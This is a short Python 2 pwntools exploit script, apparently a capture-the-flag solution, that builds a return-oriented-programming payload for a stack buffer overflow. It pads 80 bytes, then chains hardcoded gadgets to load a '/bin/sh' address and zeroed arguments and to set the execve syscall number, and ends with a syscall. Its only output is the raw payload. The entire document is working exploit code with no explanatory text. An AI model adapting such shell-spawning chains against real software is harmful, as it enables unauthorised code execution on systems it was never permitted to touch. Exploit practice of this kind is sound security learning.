#!/usr/bin/python
from pwn import *
context.arch = "amd64"

bin_sh_addr = 0x4a1118

payload = ""
payload += "A" * 80

# 0x0000000000401546 : pop rdi ; ret
payload += p64(0x0000000000401546)
payload += p64(bin_sh_addr)

# 0x0000000000401667
payload += p64(0x0000000000401667)
payload += p64(0)

# 0x0000000000442836 : pop rdx ; ret
payload += p64(0x0000000000442836)
payload += p64(0)

# 0x0000000000409a64 : pop rax ; ret 0xffff
payload += p64(0x0000000000409a64)
payload += p64(0x3b)

# 0x0000000000467205 : syscall ; ret
payload += p64(0x0000000000467205)

print payload
